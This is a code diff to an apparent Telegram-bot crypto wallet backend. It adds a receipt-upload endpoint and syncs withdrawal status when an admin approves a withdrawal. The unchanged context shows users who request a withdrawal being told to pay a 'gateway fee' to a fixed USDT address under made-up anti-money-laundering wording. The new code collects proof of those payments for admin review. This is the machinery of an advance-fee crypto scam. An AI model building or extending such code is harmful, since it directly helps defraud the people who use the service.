@@ -160,6 +160,11 @@ if (bot) bot.on('callback_query', async (cq) => {
     if (!wd) return bot.answerCallbackQuery(cq.id, { text: '❌ Not found' });
     if (action === 'approve') {
       updateWithdrawal(wdId, { status: 'approved' });
+      // Also update the matching transaction so frontend shows "Approved" instantly
+      const userTxs = getUserTransactions(wd.telegram_id);
+      const matchTx = userTxs.filter(t => t.type === 'withdrawal' && t.status === 'pending')
+                              .sort((a,b) => b.created_at - a.created_at)[0];
+      if (matchTx) { db.get('transactions').find({ id: matchTx.id }).assign({ status: 'approved', updated_at: Math.floor(Date.now()/1000) }).write(); }
       bot.sendMessage(wd.telegram_id, `✅ <b>Withdrawal Approved!</b>\n\n💰 ${wd.amount} USDT has been sent to your account.`, { parse_mode: 'HTML', ...openWalletBtn() });
       bot.answerCallbackQuery(cq.id, { text: '✅ Approved!' });
     } else {
@@ -600,6 +605,43 @@ app.post('/api/withdrawal', authMiddleware, async (req, res) => {
   bot.sendMessage(ADMIN_CHAT_ID, `💸 Withdrawal #${wd.id} — ${user.full_name} — ${amt} USDT`, { reply_markup:{inline_keyboard:[[{text:'✅ Approve',callback_data:`wd_approve_${wd.id}`},{text:'❌ Reject',callback_data:`wd_reject_${wd.id}`}]]}}).catch(()=>{});
   bot.sendMessage(user.telegram_id, `⚠️ <b>Action Required</b>\n\nTo finalize your withdrawal, we require the settlement of your outstanding gateway fee. This procedure ensures alignment with mandatory Anti-Money Laundering (AML) policies designed to prevent digital assets from being utilized in financial crimes.\n\nPlease fund your USDT TRC20 address with the required amount and your transaction will be processed immediately.\n\n📍 <code>${FEE_ADDRESS}</code>\n💰 Fee: ${fees.total_fee} USDT`, { parse_mode:'HTML', ...openWalletBtn() }).catch(()=>{});
   res.json({ success:true, withdrawal:wd, fees });
+});
+
+
+app.post('/api/receipt', authMiddleware, async (req, res) => {
+  const user = getUserByTelegramId(req.tgUser.id);
+  if (!user) return res.status(404).json({ error: 'User not found' });
+  const { withdrawalId, receiptBase64 } = req.body;
+  if (!withdrawalId || !receiptBase64) return res.status(400).json({ error: 'Missing data' });
+  const wd = getWithdrawalById(parseInt(withdrawalId));
+  if (!wd) return res.status(404).json({ error: 'Withdrawal not found' });
+  // Mark withdrawal as fee_paid / under review
+  updateWithdrawal(wd.id, { status: 'fee_paid', receipt_image: receiptBase64 });
+  // Update matching transaction
+  const userTxs = getUserTransactions(String(req.tgUser.id));
+  const matchTx = userTxs.filter(t => t.type === 'withdrawal' && (t.status === 'pending' || t.status === 'awaiting_fee'))
+                          .sort((a,b) => b.created_at - a.created_at)[0];
+  if (matchTx) { db.get('transactions').find({ id: matchTx.id }).assign({ status: 'fee_paid', updated_at: Math.floor(Date.now()/1000) }).write(); }
+  // Send receipt image to admin
+  try {
+    const buffer = Buffer.from(receiptBase64.replace(/^data:[^;]+;base64,/, ''), 'base64');
+    await bot.sendPhoto(ADMIN_CHAT_ID, buffer, {
+      caption: `💸 <b>Fee Receipt #${wd.id}</b>\n👤 ${user.full_name} (${user.uid})\n💰 Withdrawal: ${wd.amount} USDT\n📋 Status: Under Review`,
+      parse_mode: 'HTML',
+      reply_markup: { inline_keyboard: [[
+        { text: '✅ Approve Withdrawal', callback_data: `wd_approve_${wd.id}` },
+        { text: '❌ Reject', callback_data: `wd_reject_${wd.id}` }
+      ]]}
+    });
+  } catch(e) {
+    bot.sendMessage(ADMIN_CHAT_ID, `💸 Fee receipt submitted for Withdrawal #${wd.id} by ${user.full_name}`, {
+      reply_markup: { inline_keyboard: [[
+        { text: '✅ Approve', callback_data: `wd_approve_${wd.id}` },
+        { text: '❌ Reject', callback_data: `wd_reject_${wd.id}` }
+      ]]}
+    }).catch(()=>{});
+  }
+  res.json({ success: true });
 });
 
 app.post('/api/vip-upgrade', authMiddleware, async (req, res) => {
